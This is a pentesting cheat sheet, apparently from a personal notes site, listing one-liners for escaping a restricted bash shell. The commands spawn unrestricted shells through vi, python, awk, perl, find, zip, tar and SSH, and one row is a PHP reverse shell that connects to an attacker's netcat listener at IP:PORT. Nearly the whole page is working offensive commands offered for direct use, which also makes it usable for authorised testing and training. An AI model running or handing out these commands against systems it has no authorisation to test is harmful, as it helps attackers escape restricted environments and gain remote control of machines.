# Linux PrivEsc CheatSheet
[Home](../../index.md) | [CheatSheets](../../cheatsheets.md) | [About](../../about.md)

## Restricted Bash Shell Breakout:
                                                                	
| Command                                                                                           	| Notes                                                                                                                                    	                |
|-----------------------------------------------------------------------------------------------------|----------------------------------------------------------------------------------------------------------------------------------------	|
| $SHELL                                                                                            	| Determine if we are in an rbash shell (/bin/rbash)                                                                                       	|
| ssh user@ip -t "bash --noprofile"                                                                 	| Bypass rbash if we can use SSH along with a known username and password                                                                  	|
| vi<br>:set shell=/bin/bash<br>:shell                                                              	| Use vi or vim to breakout of rbash and use /bin/bash, alternatively could use any other shell. E.g zsh<br>                               	|
| php -r '$sock=fsockopen("IP",PORT);exec("/bin/bash -i <&3 >&3 2>&3");'                            	| Use PHP to create a reverse shell connection to a netcat listener on our machine @ IP:PORT, note we need to start <br>a netcat listener. 	|
| python -c 'import os; os.system("/bin/bash");'<br>python3 -c 'import os; os.system("/bin/bash");' 	| Use Python if available on the target system to escape rbash and spawn a generic bash shell.                                             	|
| awk 'BEGIN {system("/bin/bash")}'                                                                 	| Escape rbash using AWK                                                                                                                   	|
| perl -e 'system("/bin/bash");'                                                                    	| Use PERL to escape rbash and spawn a bash shell                                                                                          	|
| find / -name test -exec /bin/sh or /bin/bash \;                                                   	| Use the find command to execute the /bin/bash binary                                                                                     	|
| cp /bin/bash .                                                                                    	| Copy the /bin/bash binary to your current directory, this only works if / is allowed.                                                    	|
| zip /tmp/test.zip /tmp/test -T --unzip-command="sh -c /bin/bash"                                  	| Use the zip command to spawn a bash shell, create a zip file first using touch.                                                          	|
| tar cf /dev/null testfile --checkpoint=1 --checkpoint-action=exec=/bin/bash                       	| Use the tar command to execute the bash binary upon archive creation.                                                                    	|


